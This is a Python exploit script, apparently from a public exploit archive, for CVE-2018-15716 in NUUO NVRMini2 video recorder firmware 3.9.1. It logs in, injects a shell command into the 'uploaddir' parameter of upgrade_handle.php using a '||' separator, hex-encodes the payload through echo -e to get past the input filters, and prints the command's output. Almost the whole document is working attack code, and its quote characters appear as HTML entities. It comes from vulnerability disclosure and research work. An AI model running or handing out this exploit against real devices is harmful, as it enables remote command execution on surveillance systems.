# Exploit Author: Artem Metla
# Vendor Homepage: https://www.nuuo.com/ProductNode.php?node=2#
# Version: 3.9.1
# Tested on: NUUO NVRMini2 with firmware 3.9.1
# CVE : CVE-2018-15716
# Advisory: https://www.tenable.com/security/research/tra-2018-41
 
import argparse
import requests
import urllib.parse
import binascii
import http.cookiejar as cookielib
import re
 
 
def run(target, username, password, command):
    """ Authenticate us and execute exploitation """
    # Step 1. Authentication
    payload = {&#039;language&#039;:&#039;en&#039;, &#039;user&#039;:username, &#039;pass&#039;:password,
&#039;submit&#039;:&#039;Login&#039;}
    r = requests.post(urllib.parse.urljoin(target, &#039;login.php&#039;),
data=payload, verify=False, allow_redirects=False)
 
    jar = r.cookies
 
    # Step 2. Prepare a payload
 
    # We&#039;re bypassing 2 filters:
    # 1) Instead of using ";" we can try || or &&, to bypass:
    #    if(strpos($uploaddir, &#039;;&#039;) !== false)
    #    {
    #      die(&#039;[1]Not a valid path.&#039;);
    #    }
 
    # 2) To bypass this:
    #    $cmd = "sed -i &#039;s/".str_replace(&#039;/&#039;, &#039;\/&#039;,
$current_dir)."/".str_replace(&#039;/&#039;, &#039;\/&#039;, $tmp_upload_dir)."/g&#039;
".PHP_CINF_PATH;
    #    we have to HEX encode a payload
    #
    #    Simple example of payload that we&#039;re trying to achieve: &#039;||ls`echo
-e "\\x20\\x2f"`||&#039; to execue: ls /
 
    # 3) Multiple parameters commands are not supported yet, but the same
techique could be used for them
 
    # Primitive Bash command parser
    splitted_command = [command]
    for i in range(0, len(command)-1):
        if command[i] == " " and command[i+1] != "-":
            splitted_command = [command[:i], command[i+1:]]
            break
 
    # Encoding a payload
    if len(splitted_command) == 2:
        payload = "".join(&#039;\\\\x%s&#039; %
binascii.hexlify(char.encode(&#039;ascii&#039;)).decode("utf-8") for char in
splitted_command[1])
        exploit = &#039;\&#039;||%s `echo -e "%s"`||\&#039;&#039; % (splitted_command[0],
payload)
        print("Exploit: %s" % exploit)
    else:
        exploit = &#039;\&#039;||%s||\&#039;&#039; % (splitted_command[0])
        print("Exploit: %s" % exploit)
 
    # Step 3. Send a payload
    payload = {&#039;cmd&#039;:&#039;writeuploaddir&#039;, &#039;uploaddir&#039;:exploit}
    r = requests.get(urllib.parse.urljoin(target, &#039;upgrade_handle.php&#039;),
params=payload, verify=False, cookies=jar)
 
    # Step 4. Output processing to grab only needed output
    res = re.search(&#039;upload_tmp_dir=([^<>]*)<br />&#039;, str(r.content))
    if res:
        print(res.group(1).replace(&#039;\\n&#039;, &#039;\n&#039;))
 
 
def main():
    """ Parse command line arguments and start exploit """
    parser = argparse.ArgumentParser(
            add_help=False,
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="Examples: %(prog)s -t http://192.168.0.1/ -u username
-p password -c whoami")
 
    # Adds arguments to help menu
    parser.add_argument("-h", action="help", help="Print this help message
then exit")
    parser.add_argument("-t", dest="target", required="yes", help="Target
URL address like: https://localhost:443/")
    parser.add_argument("-u", dest="username", required="yes",
help="Username to authenticate")
    parser.add_argument("-p", dest="password", required="yes",
help="Password to authenticate")
    parser.add_argument("-c", dest="command", required="yes", help="Shell
command to execute")
 
    # Assigns the arguments to various variables
    args = parser.parse_args()
 
    run(args.target, args.username, args.password, args.command)
 
 
#
# Main
#
 
if __name__ == "__main__":
    main()

